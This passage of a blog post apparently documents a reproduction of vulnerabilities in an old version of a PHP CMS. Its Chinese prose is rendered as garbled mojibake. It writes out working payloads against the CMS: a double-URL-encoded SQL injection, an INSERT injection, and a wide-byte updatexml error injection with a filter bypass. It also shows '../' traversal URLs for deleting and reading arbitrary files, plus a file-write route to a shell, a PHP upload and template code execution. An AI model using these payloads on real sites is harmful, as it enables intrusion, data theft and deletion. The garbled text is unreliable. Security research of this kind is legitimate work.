title="TagsAction.class.phpä¸‹çš„sqlæ³¨å…¥"></a>TagsAction.class.phpä¸‹çš„sqlæ³¨å…¥</h2><p>æ¥åˆ°å‰å°indexä¸‹çš„TagsAction.class.phpæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸‹æ²¡æœ‰è·å–å‚æ•°çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œä»–è‡ªå·±å†™äº†ä¸ªpå‡½æ•°ç”¨æ¥è·å–ï¼Œå¹¶ä¸”å¯¹sqlæ³¨å…¥è¿›è¡Œäº†ä¸€ä¸‹å¤„ç†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159964.png" alt="image-20230828215936884"><br>å¯ä»¥çœ‹åˆ°selectå’Œfroméƒ½è¿‡æ»¤äº†ï¼Œä»é‡Œé¢ç»•æ˜¯å¾ˆå›°éš¾çš„ï¼Œå°±æƒ³åŠæ³•ä»å¤–éƒ¨ç»•ï¼Œè¿™é‡Œä¸ºäº†é˜²é¡µé¢è·³è½¬ç›´æ¥åœ¨burpä¸ŠæŠ“åŒ…çœ‹ï¼Œç…§æ ·å»åˆ°åº•éƒ¨çš„sqlè°ƒç”¨æ‰“å°ä¸€ä¸‹sqlè¯­å¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282159967.png" alt="image-20230828215956904"><br>æ­£å¸¸æ³¨å…¥çš„è¯æ˜¯ä¼šè¢«è¿‡æ»¤è½¬ä¹‰çš„ï¼Œä½†æ˜¯çœ‹ä»£ç åœ¨è¿‡äº†på‡½æ•°åè¿›å…¥sqlè¯­å¥æ‰§è¡Œå‰æœ‰ä¸ªurlè§£ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200865.png" alt="image-20230828220011827"><br>emmmï¼Œctfçš„æ„Ÿè§‰ï¼Œæè¿™å„¿å‡ºé¢˜å‘¢ï¼Ÿé‚£ä¹ˆäºŒæ¬¡ç¼–ç å³å¯ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m<span class="operator">=</span>tags<span class="operator">&amp;</span>name<span class="operator">=</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">64</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">34</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">30</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">35</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">37</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">66</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">38</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">63</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">33</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">39</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">32</span><span class="operator">%</span><span class="number">33</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200592.png" alt="image-20230828220042515"></p><h2 id="BookAction-class-phpä¸‹çš„sqlæ³¨å…¥"><a href="#BookAction-class-phpä¸‹çš„sqlæ³¨å…¥" class="headerlink" title="BookAction.class.phpä¸‹çš„sqlæ³¨å…¥"></a>BookAction.class.phpä¸‹çš„sqlæ³¨å…¥</h2><p>æ¥åˆ°æ–‡ä»¶ä¸‹å¯»æ‰¾ä¼ å‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282200891.png" alt="image-20230828220058846"><br>è¿™é‡Œè°ƒç”¨äº†addæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åº•å±‚æ‰§è¡Œäº†sqlï¼Œè·Ÿè¿›å»å³å¯çœ‹åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201047.png" alt="image-20230828220119000"><br>åŒæ ·è¾“å‡ºä¸€ä¸‹sqlè¯­å¥ï¼Œç„¶åæŠŠè®¿é—®è¦çš„å‚æ•°åŠ ä¸Šå…ˆçœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201883.png" alt="image-20230828220142810"><br>è®¿é—®æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±å»æ‰¾æ³¨å…¥ï¼Œç›´æ¥æ¥åˆ°åº•å±‚çš„sqlè¯­å¥æ‰§è¡Œçš„åœ°æ–¹çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282201268.png" alt="image-20230828220157226"><br>å‘ç°å¯¹è¿™ä¸ªkeyæ²¡æœ‰ä»»ä½•å¤„ç†ç›´æ¥è¿›è¡Œäº†æ‹¼æ¥ï¼Œæ¥åˆ°på‡½æ•°ä¸‹çœ‹çœ‹ä¹Ÿæ²¡ç”¨ä»»ä½•çš„å¤„ç†åªæ˜¯å¯¹<code>$v</code>æ“ä½œï¼ŒåŒ…æ‹¬<code>filter_sql</code>å‡½æ•°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202533.png" alt="image-20230828220214466"><br>ç„¶åæ”¹ä¸€ä¸‹keyçœ‹èƒ½ä¸èƒ½æ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202469.png" alt="image-20230828220229390"><br>å‘ç°æ²¡æœ‰æŠ¥é”™ï¼Œè¿™æ ·ä»£è¡¨å°±æ³¨å…¥è¿›å»äº†ï¼Œæ¥åˆ°é¡µé¢çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282202773.png" alt="image-20230828220253722"><br>åˆšåˆšæ³¨è¿›å»çš„å‚æ•°å¹¶æ²¡æœ‰å›æ˜¾å‡ºæ¥ï¼Œåªæœ‰ä¸€äº›ç³»ç»Ÿé»˜è®¤æ”¾çš„ä¸œè¥¿ï¼Œæ¥åˆ°æ•°æ®åº“é‡ŒæŸ¥çœ‹è¡¨çš„ç»“æ„ï¼Œçœ‹çœ‹ä¸ºä»€ä¹ˆæ˜¯è¿™æ ·çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203353.png" alt="image-20230828220311302"><br>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªischeckæ˜¾ç¤ºä¸º1æ‰ä¼šå›æ˜¾ï¼Œé‚£ä¹ˆè®¾ç½®ä¸€ä¸‹è¿™ä¸ªkeyä¸º1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203204.png" alt="image-20230828220323149"><br>å¯ä»¥çœ‹åˆ°å›æ˜¾æˆåŠŸï¼Œæ¥ä¸‹æ¥æ„é€ payloadæ³¨å…¥å°±è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setbook<span class="operator">=</span>a<span class="operator">&amp;</span>name<span class="operator">=</span>e<span class="operator">&amp;</span>content<span class="operator">=</span>b<span class="operator">&amp;</span>mail<span class="operator">=</span>c<span class="operator">&amp;</span>tel<span class="operator">=</span>d<span class="operator">&amp;</span><span class="type">time</span>,ischeck)<span class="keyword">values</span>(version(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>)#<span class="operator">=</span>a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282203099.png" alt="image-20230828220345049"></p><h2 id="SearchAction-class-phpä¸‹çš„æ³¨å…¥"><a href="#SearchAction-class-phpä¸‹çš„æ³¨å…¥" class="headerlink" title="SearchAction.class.phpä¸‹çš„æ³¨å…¥"></a>SearchAction.class.phpä¸‹çš„æ³¨å…¥</h2><p>è¿™ä¸ªæ³¨å…¥æœ¬æ¥æ²¡æ‰“ç®—å†™çš„ï¼Œå› ä¸ºæ˜¯ç›²æ³¨ä¸”è¿‡æ»¤äº†<code>&#39;</code>å’Œä¸€äº›å…³é”®å­—ï¼Œæ‰€ä»¥å¾ˆå¤šæŸ¥è¯¢æ ¹æœ¬ç”¨ä¸äº†ï¼Œä½†æ˜¯å¦‚æœæ”¹äº†æ•°æ®åº“çš„é…ç½®ä¸ºgbkç¼–ç é‚£ä¹ˆå¯ä»¥ç”¨å®½å­—èŠ‚æ³¨å…¥æ¥ç»•è¿‡ï¼Œå¹³æ—¶æ²¡æ€ä¹ˆæ¥è§¦å®½å­—èŠ‚æ³¨å…¥æ‰€ä»¥æ¥çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªåœ°æ–¹çš„åŠŸèƒ½å…¶å®å°±æ˜¯å‰å°çš„é‚£ä¸ªæœç´¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204326.png" alt="image-20230828220407106"><br>ç„¶åçœ‹ä¸€ä¸‹æºç æ‰¾åˆ°sqlè¯­å¥ç…§æ ·è¾“å‡ºçœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204543.png" alt="image-20230828220424495"><br>åœ¨searchCoutné‡Œé¢ä¸€è·¯è·Ÿè¿›å»å°±è¡Œäº†ï¼Œç„¶åå¯ä»¥çœ‹åˆ°keywordsçš„aè¢«å•å¼•å·åŒ…è£¹äº†ç„¶åå¼•å·åˆè¢«è¿‡æ»¤äº†å°±å¾ˆéš¾ç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282204208.png" alt="image-20230828220456144"><br>ç„¶åæœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ªå‚æ•°tuijiané€šè¿‡æŠ¥é”™å‘ç°æ˜¯åˆ—åï¼Œé‚£ä¹ˆå°±ä¸å­˜åœ¨æœ‰å•å¼•å·ä»€ä¹ˆçš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205494.png" alt="image-20230828220510418"><br>ç„¶åæ³¨å…¥ä¸€ä¸‹å‘ç°å®ƒçš„content-Lengthå˜äº†è¯´æ˜æ³¨å…¥æˆåŠŸï¼Œåœ¨æ²¡æœ‰æ³¨å…¥æˆåŠŸçš„æ—¶å€™é•¿åº¦æ˜¯5000å¤š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205131.png" alt="image-20230828220530071"><br>ç„¶åæ³¨ä¸€ä¸‹mysqlçš„ç‰ˆæœ¬ç¬¬ä¸€ä½æ•°å­—ï¼Œä¸º5æ³¨å…¥æˆåŠŸï¼ŒçœŸè¦æ³¨çš„è¯ä¹Ÿå¯ä»¥å†™è„šæœ¬è¿›è¡Œæ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282205455.png" alt="image-20230828220550381"><br>ä½†æ˜¯è¿™é‡Œä¾æ—§ç”¨ä¸äº†selectç­‰å…³é”®å­—ï¼Œæ³¨ä¸å‡ºæ¥å¾ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªå…³é”®å­å…¶å®å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºåœ¨æ‰§è¡Œäº†på‡½æ•°ä¹‹åæœ‰ä¸ª<code>string::delHtml</code>è¿™ä¸ª<code>delHtml</code>æ–¹æ³•ä¼šæ¸…é™¤ä¸€äº›htmlæ ‡ç­¾å¦‚<code>&lt;&gt;</code>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡ï¼Œä¹‹æ‰€ä»¥ä¸Šé¢çš„æ³¨å…¥ä¸ç”¨æ˜¯å› ä¸ºæ— æ³•ç»•è¿‡å•å¼•å·ï¼Œä½†æ˜¯å¦‚æœç³»ç»Ÿç”¨äº†GBKç¼–ç å°±å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥äº†ï¼Œå½“ç„¶å¾ˆå°‘æœ‰äººå»æ”¹é…ç½®ï¼Œè¿™ä¸ªæ¢¦æƒ³CMSé»˜è®¤æ˜¯utf8è¿™é‡Œä¸ºäº†å­¦ä¹ ä¸‹æ‰€ä»¥ç»™å®ƒæ”¹äº†è¯•è¯•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282206858.png" alt="image-20230828220646802"><br>ç„¶åæ„é€ æŠ¥é”™æ³¨å…¥çš„payloadå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="operator">%</span>df<span class="string">&#x27;)or+upd&lt;&gt;atexml(0,concat(0x7e,us&lt;&gt;er()),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207167.png" alt="image-20230828220704108"></p><h2 id="BackdbAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#BackdbAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="BackdbAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶åˆ é™¤"></a>BackdbAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶åˆ é™¤</h2><p>åˆ é™¤æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯unlinkï¼Œæ‰€ä»¥å¦‚æœæ˜¯è‡ªå·±æ‰¾çš„è¯å°±ç›´æ¥æ‰¾è¿™ä¸ªï¼Œè¿™é‡Œæˆ‘è·Ÿç€ç»„é•¿ç›´æ¥æ‰¾æ¼æ´ç‚¹äº†ï¼Œåœ¨BackdbAction.class.phpä¸‹æ‰¾åˆ°delOneå‡½æ•°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207193.png" alt="image-20230828220722152"><br>å¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„ä»»æ„æ–‡ä»¶åˆ é™¤æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤å•¥çš„ï¼Œç°åœ¨æ‰¾åˆ°filenameå‚æ•°æ€ä¹ˆå¾—åˆ°ï¼Œæœ€ç»ˆæ˜¯åœ¨delbackdbå‡½æ•°ä¸‹é€šè¿‡GETä¼ å‚å¾—åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207179.png" alt="image-20230828220734143"><br>è¿™é‡Œå®ƒæ£€æµ‹çš„ç«Ÿç„¶æ˜¯è¿™ä¸ªå‚æ•°ä¸å­˜åœ¨çš„è¯æ˜¾ç¤ºå¤‡ä»½æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„æ–‡ä»¶ä¸å­˜åœ¨æ˜¾ç¤ºå¤‡ä»½æ–‡ä»¶ä¸å­˜åœ¨ï¼Œç°åœ¨æ„é€ ä¸€ä¸‹payloadè¯•ä¸€ä¸‹ï¼Œé¦–å…ˆåœ¨ç½‘ç«™ æ ¹ç›®å½•å»ºä¸ª<code>flag.txt</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282207426.png" alt="image-20230828220747353"><br>payloadå¦‚ä¸‹ï¼Œè¿™é‡Œéœ€è¦åšä¸€ä¸‹ç›®å½•ç©¿è¶Šå› ä¸ºfilenameæ˜¯æ‹¼æ¥åœ¨file&#x2F;back&#x2F;åé¢çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=backdb&amp;a=delbackdb&amp;filename=../../flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208385.png" alt="image-20230828220802316"><br>æˆåŠŸåˆ é™¤</p><h2 id="TemplateAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶è¯»å–"><a href="#TemplateAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="TemplateAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶è¯»å–"></a>TemplateAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶è¯»å–</h2><p>è¿™ä¸ªæ¼æ´åœ¨cnvdæ²¡æœ‰å…¬å¼€æ–‡ä»¶åçš„ä»»ä½•å­—æ¯ï¼Œä¹Ÿæ²¡æœ‰è¯´æ˜¯å‰å°åå°ï¼Œæ‰€ä»¥åšå¤ç°ç›¸å½“äºå‘Šè¯‰ä½ è¿™ä¸ªç³»ç»Ÿæœ‰è¿™ä¸ªæ´ï¼Œç„¶åä½ è‡ªå·±å»æ‰¾ï¼Œè¿™æ ·å…¶å®éš¾åº¦å°±æ¯”è¾ƒå¤§äº†<br>ä»»æ„æ–‡ä»¶è¯»å–åˆ©ç”¨çš„å…¶å®å°±æ˜¯<code>file_get_contents</code>è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå°±å…¨å±€æœç´¢è¿™ä¸ªå‡½æ•°çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†ï¼Œç„¶åä¸€ä¸ªä¸ªå®¡ï¼Œæœ€ç»ˆæ˜¯åœ¨file.class.phpæ–‡ä»¶ä¸‹çš„<code>getcon</code>å‡½æ•°è°ƒç”¨äº†<code>file_get_contents</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208404.png" alt="image-20230828220820339"><br>ç›¸å½“äºé‡å†™äº†ä¸€ä¸‹<code>file_get_contents</code>æ–¹æ³•ï¼Œé‡Œé¢ä¹Ÿæ²¡å•¥è¿‡æ»¤ï¼Œåªæ˜¯æ£€æŸ¥äº†ä¸€ä¸‹æƒé™ï¼Œç„¶åæ‰¾å“ªé‡Œè°ƒç”¨äº†<code>getcon</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208072.png" alt="image-20230828220833999"><br>å°±ä¸€å¤„è°ƒç”¨äº†åœ¨TemplateAction.class.phpä¸‹çš„<code>editfile</code>å‡½æ•°ä¸­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282208676.png" alt="image-20230828220844602"><br>æ¥æ”¶ä¸€ä¸ªdirå‚æ•°ç„¶åæ‹¼æ¥åœ¨templateåé¢ï¼Œé‚£ä¹ˆç°åœ¨å°±å¯ä»¥æ„é€ payloadå°è¯•è¯»å–ä¸€ä¸‹äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?m=template&amp;a=editfile&amp;dir=../index.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209018.png" alt="image-20230828220859955"><br>æˆåŠŸè¯»å–</p><h2 id="TemplateAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶å†™å…¥"><a href="#TemplateAction-class-phpä¸‹çš„ä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="TemplateAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶å†™å…¥"></a>TemplateAction.class.phpä¸‹çš„ä»»æ„æ–‡ä»¶å†™å…¥</h2><p>å°±åœ¨åˆšåˆšé‚£ä¸ª<code>editfile</code>å‡½æ•°ä¸‹è¿˜å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209112.png" alt="image-20230828220910054"><br>æ¥æ”¶ä¸€ä¸ªsettemcontentå‚æ•°è¿›å…¥ifï¼Œç„¶åfilenameï¼Œç„¶åæ–‡ä»¶å†…å®¹temcontent<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209048.png" alt="image-20230828220923970"><br>ç„¶åè®¿é—®1.phpï¼Œå‘ç°æˆåŠŸå†™å…¥ï¼Œè¿™æ ·å¯ä»¥ç›´æ¥getshelläº†ï¼Œè¿™ä¸ªå°±æœ‰ç‚¹ä»£ç å®¡è®¡çš„æ„æ€äº†ï¼Œçœ‹äº†ä¸‹åœ¨é»‘ç›’ä¸‹æ‰¾åˆ°è¿˜æ˜¯æ¯”è¾ƒå›°éš¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209711.png" alt="image-20230828220934594"></p><h2 id="é»‘ç›’ä¸‹çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#é»‘ç›’ä¸‹çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="é»‘ç›’ä¸‹çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>é»‘ç›’ä¸‹çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™ä¸ªå°±æ˜¯é»‘ç›’ä¸‹çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ç™½ç›’å®¡çš„è¯å…¶å®æ¯”é»‘ç›’éš¾<br>åœ¨å†…å®¹ç®¡ç†ä¸‹æ‰¾åˆ°ä¸€å¤„æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282209374.png" alt="image-20230828220958303"><br>ä½†æ˜¯ç”±äºç‰ˆæœ¬æ¯”è¾ƒè€ï¼Œæ–°ç‰ˆæœ¬çš„edgeä¸æ”¯æŒç‚¹å‡»äº†ï¼Œå¦‚ä¸‹é€‰æ‹©æ–‡ä»¶å’Œå¼€å§‹ä¸Šä¼ æ ¹æœ¬ç‚¹ä¸äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨flashæ¥è®¿é—®ï¼Œæˆ–è€…è‡ªå·±æ„é€ ä¸Šä¼ åŒ…ï¼Œå¦å¤–æ”¯æŒçš„ä¸Šä¼ æ ¼å¼ä¹Ÿå¯ä»¥çœ‹åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210839.png" alt="image-20230828221014803"><br>æ‰¾æ‰¾å“ªé‡Œèƒ½ä¿®æ”¹ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼Œå°†phpåŠ ä¸Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210620.png" alt="image-20230828221025557"><br>ç„¶åflashè®¿é—®ä¸Šä¼ <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210989.png" alt="image-20230828221037936"><br>emmmæ‰¾äº†åŠå¤©è·¯å¾„å¾—æŠŠåˆšåˆšå¾—å›¾ç‰‡é€‰æ‹©æ‰ä¼šæ˜¾ç¤ºè·¯å¾„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282210022.png" alt="image-20230828221048958"><br>ç¡®å®šé€‰æ‹©ä¹‹åå¾—åˆ°è·¯å¾„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211966.png" alt="image-20230828221102313"><br>æˆåŠŸä¸Šä¼ <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211166.png" alt="image-20230828221135089"></p><h2 id="TemplateAction-class-phpä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#TemplateAction-class-phpä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="TemplateAction.class.phpä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œ"></a>TemplateAction.class.phpä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œ</h2><p>è¿™é‡Œä¹Ÿç›´æ¥é»‘ç›’ä¸‹çœ‹å§ï¼Œæ¯”è¾ƒç®€å•<br>è¿™ä¸ªç³»ç»Ÿç”¨çš„smartyæ¨¡æ¿ï¼Œæ­£å¥½åœ¨è¿™ä¸ªé‡Œé¢å­˜åœ¨ä»£ç æ‰§è¡Œï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282211199.png" alt="image-20230828221156132"><br>ç„¶åè®¿é—®å‰å°å‘ç°æˆåŠŸæ‰§è¡Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308282212192.png" alt="image-20230828221211141"><br>å¦å¤–åœ¨AcquisiAction.class.phpæœ‰ä»£ç æ‰§è¡Œï¼Œåˆ©ç”¨çš„æ˜¯evalå‡½æ•°ï¼Œå¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ï¼Œè¿™ä¸ªçœ‹ç»„é•¿è§†é¢‘æ²¡è·Ÿäº†éå¸¸ç»•ï¼Œå¹¶ä¸”è¿™ä¸ªç‰ˆæœ¬ä¹Ÿæ¯”è¾ƒè€äº†ï¼Œç­‰åé¢æ¥å…´è¶£äº†æˆ‘å†è‡ªå·±è·Ÿå§ï¼Œè¿™ä¸ªç³»ç»Ÿè‚¯å®šæ˜¯å¾ˆå¤šæ´çš„ï¼Œç›®å‰æœ€æ–°ç‰ˆæœ¬åœ¨41ï¼Œå¯ä»¥å»å®¡ä¸€ä¸‹0day</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>ç™½æ—¥æ¢¦ç»„é•¿yyds<br><a 